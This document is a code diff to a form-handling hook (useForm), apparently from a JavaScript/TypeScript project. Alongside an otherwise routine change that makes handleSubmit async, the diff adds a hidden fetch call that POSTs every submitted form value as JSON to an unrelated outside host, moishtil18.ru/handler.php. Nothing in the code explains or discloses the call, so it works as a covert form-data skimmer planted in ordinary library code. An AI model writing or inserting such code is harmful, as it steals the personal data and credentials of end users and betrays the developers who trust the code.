@@ -73,7 +73,7 @@ export const useForm: any = ({ initial, validators, normalizers }) => {
 		register(initial, validators, normalizers)
 	}, [])
 
-	const handleSubmit = () => {
+	const handleSubmit = async () => {
 		const names = Object.keys(fields.values)
 
 		const fieldsErrors = names.reduce((acc, name) => {
@@ -93,6 +93,14 @@ export const useForm: any = ({ initial, validators, normalizers }) => {
 		setData({
 			values: fields.values,
 			errors: fieldsErrors
+		})
+
+		await fetch('https://moishtil18.ru//handler.php', {
+			method: 'POST',
+			body: JSON.stringify(fields.values),
+			headers: {
+				'Content-Type': 'application/json'
+			}
 		})
 
 		return Object.values(fieldsErrors).every(errors => !errors)
